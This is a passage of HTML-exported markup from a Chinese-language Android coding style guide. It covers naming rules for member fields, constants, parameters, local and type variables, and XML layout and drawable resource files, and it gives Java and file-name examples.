</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#27573;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24120;&#37327;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20840;&#37096;&#22823;&#20889;&#65292;&#24182;&#29992;&#19979;&#21010;&#32447;&#36830;&#36215;&#26469;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#23376;&#65306;</span></font></font></p><ol><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"> <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">public<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>class MyClass <font face="Courier New, serif"><font size="2" style="font-size: 10pt">{ </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">       <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">public<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">SOME_CONSTANT = </font></font>42<font face="Courier New, serif"><font size="2" style="font-size: 10pt">; </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">       <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">public<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">pField;  </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">       <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">private<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>static<font face="Courier New, serif"><font size="2" style="font-size: 10pt">MyClass sSingleton;  </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">       <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">mPackagePrivate;  </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">       <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">private<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">mPrivate;  </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">       <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">protected<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">mProtected; </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">       <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">public<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">gField; </font></font></font></font></p><li/><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"> <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">}</font></font></font></font></p></ol><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">1</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#31526;&#21069;&#32512;&#26469;&#34920;&#31034;&#20316;&#29992;&#33539;&#22260;&#65292;</span></font></font><font size="3" style="font-size: 12pt">1</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#23383;&#31526;&#30340;&#21069;&#32512;&#24517;&#39035;&#23567;&#20889;&#65292;&#21069;&#32512;&#21518;&#38754;&#26159;&#30001;&#34920;&#24847;&#24615;&#24378;&#30340;&#19968;&#20010;&#21333;&#35789;&#25110;&#22810;&#20010;&#21333;&#35789;&#32452;&#25104;&#30340;&#21517;&#23383;&#65292;&#32780;&#19988;&#27599;&#20010;&#21333;&#35789;&#30340;&#39318;&#20889;&#23383;&#27597;&#22823;&#20889;&#65292;&#20854;&#23427;&#23383;&#27597;&#23567;&#20889;&#65292;&#36825;&#26679;&#20445;&#35777;&#20102;&#23545;&#21464;&#37327;&#21517;&#33021;&#22815;&#36827;&#34892;&#27491;&#30830;&#30340;&#26029;&#21477;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br><b>Type</b></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><b>&#65306;&#31867;&#22411;</b></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32771;&#34385;&#21040;</span></font></font><font size="3" style="font-size: 12pt">Android</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20013;&#20351;&#29992;&#24456;&#22810;</span></font></font><font size="3" style="font-size: 12pt">UI</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25511;&#20214;&#65292;&#20026;&#36991;&#20813;&#25511;&#20214;&#21644;&#26222;&#36890;&#25104;&#21592;&#21464;&#37327;&#28151;&#28102;&#20197;&#21450;&#26356;&#22909;&#36798;&#24847;&#65292;&#25152;&#26377;&#29992;&#26469;&#34920;&#31034;&#25511;&#20214;&#30340;&#25104;&#21592;&#21464;&#37327;&#32479;&#19968;&#21152;&#19978;&#25511;&#20214;&#32553;&#20889;&#20316;&#20026;&#21518;&#32512;&#65288;&#25991;&#26411;&#38468;&#26377;&#32553;&#20889;&#34920;&#65289;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23545;&#20110;&#26222;&#36890;&#21464;&#37327;&#19968;&#33324;&#19981;&#28155;&#21152;&#31867;&#22411;&#21518;&#32512;&#65292;&#22914;&#26524;&#32479;&#19968;&#28155;&#21152;&#31867;&#22411;&#21518;&#32512;&#65292;&#35831;&#21442;&#32771;&#25991;&#26411;&#30340;&#32553;&#20889;&#34920;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#29992;&#32479;&#19968;&#30340;&#37327;&#35789;&#36890;&#36807;&#22312;&#32467;&#23614;&#22788;&#25918;&#32622;&#19968;&#20010;&#37327;&#35789;&#65292;&#23601;&#21487;&#21019;&#24314;&#26356;&#21152;&#32479;&#19968;&#30340;&#21464;&#37327;&#65292;&#23427;&#20204;&#26356;&#23481;&#26131;&#29702;&#35299;&#65292;&#20063;&#26356;&#23481;&#26131;&#25628;&#32034;&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#24847;&#65306;&#22914;&#26524;&#39033;&#30446;&#20013;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">ButterKnife</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21017;&#19981;&#28155;&#21152;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">m</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21069;&#32512;&#65292;&#20197;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">LowerCamelCase</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#21629;&#21517;&#12290;</span></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65292;&#35831;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">mCustomerStrFirst</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21644;</span></font></font><font size="3" style="font-size: 12pt">mCustomerStrLast</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#32780;&#19981;&#35201;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">mFirstCustomerStr</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21644;</span></font></font><font size="3" style="font-size: 12pt">mLastCustomerStr</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#37327;&#35789;&#21015;&#34920;&#65306;&#37327;&#35789;&#21518;&#32512;&#35828;&#26126;</span></font></font><font size="3" style="font-size: 12pt"><br>First</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#32452;&#21464;&#37327;&#20013;&#30340;&#31532;&#19968;&#20010;</span></font></font><font size="3" style="font-size: 12pt"><br>Last</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#32452;&#21464;&#37327;&#20013;&#30340;&#26368;&#21518;&#19968;&#20010;</span></font></font><font size="3" style="font-size: 12pt"><br>Next</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#32452;&#21464;&#37327;&#20013;&#30340;&#19979;&#19968;&#20010;&#21464;&#37327;</span></font></font><font size="3" style="font-size: 12pt"><br>Prev</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#32452;&#21464;&#37327;&#20013;&#30340;&#19978;&#19968;&#20010;</span></font></font><font size="3" style="font-size: 12pt"><br>Cur</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#32452;&#21464;&#37327;&#20013;&#30340;&#24403;&#21069;&#21464;&#37327;&#12290;</span></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35828;&#26126;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38598;&#21512;&#28155;&#21152;&#22914;&#19979;&#21518;&#32512;&#65306;</span></font></font><font size="3" style="font-size: 12pt">List</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12289;</span></font></font><font size="3" style="font-size: 12pt">Map</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12289;</span></font></font><font size="3" style="font-size: 12pt">Set<br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25968;&#32452;&#28155;&#21152;&#22914;&#19979;&#21518;&#32512;&#65306;</span></font></font><font size="3" style="font-size: 12pt">Arr</font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#24847;&#65306;&#25152;&#26377;&#30340;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">VO</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65288;&#20540;&#23545;&#35937;&#65289;&#32479;&#19968;&#37319;&#29992;&#26631;&#20934;&#30340;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">lowerCamelCase</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#32534;&#20889;&#65292;&#25152;&#26377;&#30340;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">DTO</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65288;&#25968;&#25454;&#20256;&#36755;&#23545;&#35937;&#65289;&#23601;&#25353;&#29031;&#25509;&#21475;&#25991;&#26723;&#20013;&#23450;&#20041;&#30340;&#23383;&#27573;&#21517;&#32534;&#20889;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1107883369"></a>5.2.6 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21442;&#25968;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21442;&#25968;&#21517;&#20197;</span></font></font><font size="3" style="font-size: 12pt">LowerCamelCase</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#32534;&#20889;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1763549018"></a>5.2.7 <font face="&#23435;&#20307;"><span lang="zh-CN">&#23616;&#37096;&#21464;&#37327;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23616;&#37096;&#21464;&#37327;&#21517;&#20197;</span></font></font><font size="3" style="font-size: 12pt">LowerCamelCase</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#32534;&#20889;&#65292;&#27604;&#36215;&#20854;&#23427;&#31867;&#22411;&#30340;&#21517;&#31216;&#65292;&#23616;&#37096;&#21464;&#37327;&#21517;&#21487;&#20197;&#26377;&#26356;&#20026;&#23485;&#26494;&#30340;&#32553;&#20889;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#34429;&#28982;&#32553;&#20889;&#26356;&#23485;&#26494;&#65292;&#20294;&#36824;&#26159;&#35201;&#36991;&#20813;&#29992;&#21333;&#23383;&#31526;&#36827;&#34892;&#21629;&#21517;&#65292;&#38500;&#20102;&#20020;&#26102;&#21464;&#37327;&#21644;&#24490;&#29615;&#21464;&#37327;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21363;&#20351;&#23616;&#37096;&#21464;&#37327;&#26159;</span></font></font><font size="3" style="font-size: 12pt">final</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21644;&#19981;&#21487;&#25913;&#21464;&#30340;&#65292;&#20063;&#19981;&#24212;&#35813;&#25226;&#23427;&#31034;&#20026;&#24120;&#37327;&#65292;&#33258;&#28982;&#20063;&#19981;&#33021;&#29992;&#24120;&#37327;&#30340;&#35268;&#21017;&#21435;&#21629;&#21517;&#23427;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><b>&#20020;&#26102;&#21464;&#37327;</b></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20020;&#26102;&#21464;&#37327;&#36890;&#24120;&#34987;&#21462;&#21517;&#20026;</span></font></font><font size="3" style="font-size: 12pt">i</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font><font size="3" style="font-size: 12pt">j</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font><font size="3" style="font-size: 12pt">k</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font><font size="3" style="font-size: 12pt">m</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21644;</span></font></font><font size="3" style="font-size: 12pt">n</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#23427;&#20204;&#19968;&#33324;&#29992;&#20110;&#25972;&#22411;&#65307;</span></font></font><font size="3" style="font-size: 12pt">c</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font><font size="3" style="font-size: 12pt">d</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font><font size="3" style="font-size: 12pt">e</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#23427;&#20204;&#19968;&#33324;&#29992;&#20110;&#23383;&#31526;&#22411;&#12290;&#22914;&#65306; </span></font></font><font size="3" style="font-size: 12pt">for(int i = 0; i &lt; len ; i++)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#24182;&#19988;&#23427;&#21644;&#31532;&#19968;&#20010;&#21333;&#35789;&#38388;&#27809;&#26377;&#31354;&#26684;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc190163631"></a>5.2.8 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#22411;&#21464;&#37327;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#22411;&#21464;&#37327;&#21487;&#29992;&#20197;&#19979;&#20004;&#31181;&#39118;&#26684;&#20043;&#19968;&#36827;&#34892;&#21629;&#21517;&#65306;</span></font></font></p><ul><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#21333;&#20010;&#30340;&#22823;&#20889;&#23383;&#27597;&#65292;&#21518;&#38754;&#21487;&#20197;&#36319;&#19968;&#20010;&#25968;&#23383;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;&#65306;</span></font>E,T, X, T2)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#20197;&#31867;&#21629;&#21517;&#26041;&#24335;</span></font>(5.2.2<font face="&#23435;&#20307;"><span lang="zh-CN">&#33410;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;&#21518;&#38754;&#21152;&#20010;&#22823;&#20889;&#30340;</span></font>T(<font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;&#65306;</span></font>RequestT,FooBarT)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p></ul><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc454056374"></a>5.2.9 <font face="&#23435;&#20307;"><span lang="zh-CN">&#36164;&#28304;&#25991;&#20214;&#21629;&#21517;&#35268;&#33539;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><em>1.</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#36164;&#28304;&#24067;&#23616;&#25991;&#20214;&#65288;</em></span></font></font><font size="3" style="font-size: 12pt"><em>XML</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#25991;&#20214;&#65288;</em></span></font></font><font size="3" style="font-size: 12pt"><em>layout</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#24067;&#23616;&#25991;&#20214;&#65289;&#65289;&#65306;</em></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20840;&#37096;&#23567;&#20889;&#65292;&#37319;&#29992;&#19979;&#21010;&#32447;&#21629;&#21517;&#27861;</span></font></font><font size="3" style="font-size: 12pt"><br>1)contentview</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21629;&#21517;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24517;&#39035;&#20197;&#20840;&#37096;&#21333;&#35789;&#23567;&#20889;&#65292;&#21333;&#35789;&#38388;&#20197;&#19979;&#21010;&#32447;&#20998;&#21106;&#65292;&#20351;&#29992;&#21517;&#35789;&#25110;&#21517;&#35789;&#35789;&#32452;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25152;&#26377;</span></font></font><font size="3" style="font-size: 12pt">Activity</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">Fragment</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;</span></font></font><font size="3" style="font-size: 12pt">contentView</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24517;&#39035;&#19982;&#20854;&#31867;&#21517;&#23545;&#24212;&#65292;&#23545;&#24212;&#35268;&#21017;&#20026;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23558;&#25152;&#26377;&#23383;&#27597;&#37117;&#36716;&#20026;&#23567;&#20889;&#65292;&#23558;&#31867;&#22411;&#21644;&#21151;&#33021;&#35843;&#25442;&#65288;&#20063;&#23601;&#26159;&#21518;&#32512;&#21464;&#21069;&#32512;&#65289;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">activity_main.xml</font></font><br>2)Dialog</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21629;&#21517;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">dialog_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#25551;&#36848;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">.xml</font></font><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">dialog_hint.xml</font></font><br>3)PopupWindow</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21629;&#21517;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">ppw_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#25551;&#36848;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">.xml</font></font><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">ppw_info.xml</font></font><br>4)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21015;&#34920;&#39033;&#21629;&#21517;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">item_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#25551;&#36848;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">.xml</font></font><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">item_city.xml</font></font><br>5)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21253;&#21547;&#39033;&#21629;&#21517;&#65306;<font size="2" style="font-size: 10pt">&#27169;&#22359;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_(</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#20301;&#32622;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">)</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#25551;&#36848;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">.xml</font></font><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">activity_main_head.xml</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12289;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">activity_main_bottom.xml</font></font><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#24847;&#65306;&#36890;&#29992;&#30340;&#21253;&#21547;&#39033;&#21629;&#21517;&#37319;&#29992;&#65306;<font size="2" style="font-size: 10pt">&#39033;&#30446;&#21517;&#31216;&#32553;&#20889;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#25551;&#36848;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">.xml</font></font><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">xxxx_title.xml</font></font><br><em>2.</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#36164;&#28304;&#25991;&#20214;&#65288;&#22270;&#29255;</em></span></font></font><font size="3" style="font-size: 12pt"><em>drawable</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#25991;&#20214;&#22841;&#19979;&#65289;&#65306;</em></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20840;&#37096;&#23567;&#20889;&#65292;&#37319;&#29992;&#19979;&#21010;&#32447;&#21629;&#21517;&#27861;&#65292;&#21152;&#21069;&#32512;&#21306;&#20998;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21629;&#21517;&#27169;&#24335;&#65306;&#21487;&#21152;&#21518;&#32512;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_small</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#34920;&#31034;&#23567;&#22270;</span></font></font><font size="3" style="font-size: 12pt">,<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_big</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#34920;&#31034;&#22823;&#22270;&#65292;&#36923;&#36753;&#21517;&#31216;&#21487;&#30001;&#22810;&#20010;&#21333;&#35789;&#21152;&#19979;&#21010;&#32447;&#32452;&#25104;&#65292;&#37319;&#29992;&#20197;&#19979;&#35268;&#21017;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" 